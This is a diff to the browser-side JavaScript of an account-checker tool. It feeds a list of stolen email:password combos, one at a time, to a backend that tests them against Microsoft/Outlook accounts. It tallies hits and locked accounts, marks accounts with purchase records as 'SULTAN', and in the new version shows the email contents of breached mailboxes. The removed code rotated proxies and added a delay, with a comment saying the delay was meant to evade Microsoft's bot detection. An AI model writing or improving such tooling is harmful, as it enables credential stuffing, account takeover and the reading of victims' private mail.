@@ -1,105 +1,64 @@
 let isRunning = false;
-let stats = { checked: 0, hit: 0, bad: 0, locked: 0, sultan: 0 };
-let startTime;
-
-const startBtn = document.getElementById('start-btn');
-const stopBtn = document.getElementById('stop-btn');
-const hitsTable = document.getElementById('res-table');
+let stats = { checked: 0, hit: 0, bad: 0, locked: 0 };
+const modal = document.getElementById('emailModal');
 
 function updateStats() {
     document.getElementById('s-checked').innerText = stats.checked;
     document.getElementById('s-hit').innerText = stats.hit;
     document.getElementById('s-bad').innerText = stats.bad;
     document.getElementById('s-locked').innerText = stats.locked;
-    
-    // Update CPM (Checks Per Minute)
-    if (isRunning) {
-        const elapsedMinutes = (Date.now() - startTime) / 60000;
-        const cpm = elapsedMinutes > 0 ? Math.floor(stats.checked / elapsedMinutes) : 0;
-        document.getElementById('cpm-display').innerText = `CPM: ${cpm}`;
-    }
 }
 
-function addTableRow(data) {
+function addRow(data) {
     const row = document.createElement('tr');
+    const badge = data.isSultan ? `<span class="badge-sultan">SULTAN</span>` : `<span style="color:#3fb950">HIT</span>`;
     
-    // Logika Badge Status & Sultan
-    let statusHtml = `<span class="badge-hit">HIT</span>`;
-    let dataHtml = `<span style="color: #8b949e;">${data.count} Emails Found</span>`;
-    
-    if (data.isSultan) {
-        statusHtml = `<span style="background: #ffcc00; color: #000; padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 11px;">⭐ SULTAN</span>`;
-        dataHtml = `<span style="color: #ffcc00; font-weight: bold;">[!] PURCHASE RECORD FOUND</span>`;
-        stats.sultan++;
-    } else if (data.status === 'LOCKED') {
-        statusHtml = `<span style="background: #f39c12; color: #fff; padding: 3px 8px; border-radius: 4px; font-size: 11px;">LOCKED</span>`;
-    }
+    // Simpan body email di window object agar bisa dipanggil modal
+    const emailId = `mail_${Date.now()}`;
+    window[emailId] = data.body;
 
     row.innerHTML = `
-        <td style="color: #c9d1d9; font-family: monospace;">${data.combo.split(':')[0]}</td>
-        <td>${statusHtml}</td>
-        <td>${dataHtml}</td>
-        <td><button class="btn-primary" style="padding:4px 10px; font-size:10px; border-radius:4px;" onclick="window.open('https://outlook.live.com')">OPEN MAIL</button></td>
+        <td>${data.combo.split(':')[0]}</td>
+        <td>${badge}</td>
+        <td style="color:#888">${data.preview}</td>
+        <td><button onclick="viewMail('${emailId}')" class="btn-primary" style="padding:4px 8px; font-size:10px">VIEW CONTENT</button></td>
     `;
-    
-    hitsTable.prepend(row);
+    document.getElementById('res-table').prepend(row);
 }
 
-async function startChecking() {
-    const comboRaw = document.getElementById('inp-combos').value.split('\n').filter(c => c.includes(':'));
-    const proxyRaw = document.getElementById('inp-proxies').value.split('\n').filter(p => p.trim() !== '');
+function viewMail(id) {
+    document.getElementById('mail-body').innerText = window[id] || "No Content Available";
+    modal.style.display = "block";
+}
 
-    if (comboRaw.length === 0) return alert("Combo list is empty!");
+function closeModal() { modal.style.display = "none"; }
 
-    // Reset dan Start
+document.getElementById('start-btn').onclick = async () => {
+    const lines = document.getElementById('inp-combos').value.split('\n').filter(l => l.includes(':'));
+    if (lines.length === 0) return alert("Combo list empty!");
+
     isRunning = true;
-    startTime = Date.now();
-    startBtn.disabled = true;
-    stopBtn.disabled = false;
-    
-    for (let i = 0; i < comboRaw.length; i++) {
+    document.getElementById('start-btn').disabled = true;
+    document.getElementById('stop-btn').disabled = false;
+
+    for (let line of lines) {
         if (!isRunning) break;
-
-        const combo = comboRaw[i].trim();
-        const proxy = proxyRaw.length > 0 ? proxyRaw[i % proxyRaw.length] : null;
-
         try {
-            const response = await fetch('/api/check', {
+            const res = await fetch('/api/check', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ combo, proxy })
+                body: JSON.stringify({ combo: line.trim() })
             });
-
-            const result = await response.json();
-
+            const data = await res.json();
             stats.checked++;
-            if (result.status === 'HIT') {
-                stats.hit++;
-                addTableRow(result);
-            } else if (result.status === 'LOCKED') {
-                stats.locked++;
-                // Opsional: Tetap tampilkan di tabel jika ingin melihat yang terkunci
-                // addTableRow(result); 
-            } else {
-                stats.bad++;
-            }
-
+            if (data.status === 'HIT') { stats.hit++; addRow(data); }
+            else if (data.status === 'LOCKED') { stats.locked++; }
+            else { stats.bad++; }
             updateStats();
-        } catch (error) {
-            console.error("Worker Error:", error);
-            stats.bad++;
-            updateStats();
-        }
-
-        // Delay 300ms agar tidak memicu deteksi bot Microsoft terlalu cepat
-        await new Promise(r => setTimeout(r, 300));
+        } catch (e) { stats.bad++; updateStats(); }
     }
-
     isRunning = false;
-    startBtn.disabled = false;
-    stopBtn.disabled = true;
-    alert(`Checking Complete! Found ${stats.hit} Hits (${stats.sultan} Sultan)`);
+    document.getElementById('start-btn').disabled = false;
 }
 
-startBtn.onclick = startChecking;
-stopBtn.onclick = () => { isRunning = false; };
+document.getElementById('stop-btn').onclick = () => { isRunning = false; };
